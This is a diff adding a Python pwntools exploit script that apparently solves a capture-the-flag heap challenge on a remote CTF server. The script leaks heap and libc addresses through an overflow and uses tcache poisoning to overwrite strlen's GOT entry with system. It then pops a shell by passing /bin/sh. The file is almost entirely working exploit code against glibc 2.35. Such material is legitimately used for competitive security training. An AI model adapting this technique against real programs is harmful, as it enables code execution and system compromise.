@@ -1,0 +1,117 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./domainexpansion_patched")
+libc = ELF("./libc-2.35.so")
+ld = ELF("./ld-2.35.so")
+
+context.binary = exe
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("vsc.tf", 7001)
+
+    return r
+
+p = conn()
+
+def create(index: int, size: int):
+    p.sendlineafter("choice: ", "1")
+    p.sendlineafter("index: ", str(index).encode())
+    p.sendlineafter("size: ", str(size).encode())
+
+def edit(index: int, data: bytes):
+    p.sendlineafter("choice: ", "2")
+    p.sendlineafter("index: ", str(index).encode())
+    p.sendlineafter("data: ", data)
+
+def read(index: int):
+    p.sendlineafter("choice: ", "3")
+    p.sendlineafter("index: ", str(index).encode())
+    p.recvuntil("Data: ")
+    return p.recvline().strip()
+
+def delete(index: int):
+    p.sendlineafter("choice: ", "4")
+    p.sendlineafter("index: ", str(index).encode())
+
+def expand(index: int, size: int):
+    p.sendlineafter("choice: ", "260")
+    p.sendlineafter("index: ", str(index).encode())
+    p.sendlineafter("size: ", str(size).encode())
+
+create(0, 32)
+expand(0, 0x1000)
+create(1, 32)
+create(2, 0x500)
+create(15, 32)
+
+
+# chunk 0 32 
+# chunk 1 32 
+# chunk 2 0x500 
+# chunk 15 32   (prevent consolation)
+
+# leak heap address
+delete(1)
+edit(0, b'A' * 48)
+heap = unpack(read(0)[-5:].ljust(8, b'\x00')) << 12
+
+# restore chunk 1
+edit(0, b'A' * 32 + pack(0) + pack(0x31))
+create(1, 32)
+
+# leak libc
+delete(2)
+edit(0, b'A' * (48 * 2))
+print(read(0))
+
+libc.address = unpack(read(0)[-6:].ljust(8, b'\x00')) - libc.sym['main_arena'] - 96
+print(hex(libc.address))
+
+# restore chunk 1 and freed chunk 2
+edit(0, b'A' * 32 + pack(0) + pack(0x31) + b'A' * 32 + pack(0) + pack(0x511))
+
+
+# chunk 0 32
+# chunk 1 32 
+# FREE 0x500
+# chunk 15 32
+
+
+create(2, 32)
+create(3, 32) # prevent consolidation with chunk 2
+
+delete(2)
+delete(1)
+
+
+# bin[0x20] -> chunk 1 -> chunk 2
+target = libc.address + 0x21a098 - 0x18
+encrypted = (heap >> 12) ^ target
+edit(0, b'A' * 32 + pack(0) + pack(0x21) + pack(encrypted))
+
+# clean unsorted bin
+create(14, 0x500 - 48 * 2)
+
+# chunk 0 32 
+# tcache 0 32 -> .got.plt
+# some free chunk 32 
+# chunk 3 32 
+# chunk 14 0x500 - 48 * 2
+# chunk 15 32 
+
+create(1, 32)
+create(2, 32) # controlled
+
+edit(0, b'/bin/sh\x00')
+# restore addresses + change strlen to system
+edit(2, pack(libc.address+0x1a10c0) + pack(libc.address+0x280f0) + pack(libc.address+0x19f040) + pack(libc.sym['system']))
+read(0)
+
+p.interactive()
